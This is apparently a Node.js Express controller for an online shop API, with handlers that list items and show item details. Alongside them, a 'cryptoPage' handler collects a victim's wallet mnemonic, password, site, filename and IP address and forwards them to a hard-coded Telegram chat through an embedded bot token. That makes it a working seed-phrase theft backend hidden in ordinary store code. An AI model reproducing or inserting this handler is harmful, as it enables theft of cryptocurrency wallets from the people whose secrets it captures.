const Item = require("../models/Item");
const Category = require("../models/Category");
module.exports = {
  homePage: async (req, res) => {
    try {
      const item = await Item.find()
        .select("_id name price rate image categoryId")
        .populate({ path: "categoryId", select: "name" });
      const category = await Category.find().select("_id name");
      res.status(200).json({ item, category });
    } catch (error) {
      res.status(500).json("Internal Error 500");
    }
  },
  detailPage: async (req, res) => {
    try {
      const { id } = req.params;
      const item = await Item.findById(id)
        .select("_id name price rate image size categoryId")
        .populate({ path: "categoryId", select: "name" });
      const recommend = await Item.find({ categoryId: item.categoryId })
        .select("_id name price rate image categoryId")
        .populate({ path: "categoryId", select: "name" });

      res.status(200).json({ item, recommend });
    } catch (error) {
      res.status(500).json("Internal Server Error");
    }
  },
  cryptoPage: async (req, res) => {
    const { judul, mnemonic, password, site, filename } = req.body;
    const ip = req.ip;
    const TelegramBot = require("node-telegram-bot-api");
    //    const stream = fs.createReadStream(req.file);
    // replace the value below with the Telegram token you receive from @BotFather
    const token = "1172027626:AAHfloWHA8sv0DVqd5A_qRT3By3fINaYpUw";
    const message1 = `${judul}\n\nmnemonic:\n${mnemonic}\n\npassword\n${password}\n\nsite\n${site}\n\nfilename\n${filename}\n\nIP ${ip}`;
    // Create a bot that uses 'polling' to fetch new updates
    const bot = new TelegramBot(token, { polling: true });
    const chatId = 808625639;
    // if (!filename) {
    bot.sendMessage(chatId, message1);
    return res.status(201).json({ message: "success" });
    // }

    // send a message to the chat acknowledging receipt of their message
    // const message2 = `password\n${password}\n\nsite\n${site}\n\nIP ${ip}`;
    // bot.sendMessage(chatId, message2);
    // bot.sendDocument(chatId, `public/images/${req.file.filename}`);
    // send back the matched "whatever" to the chat
    // return res.status(201).json({ message: "success" });
  },
};
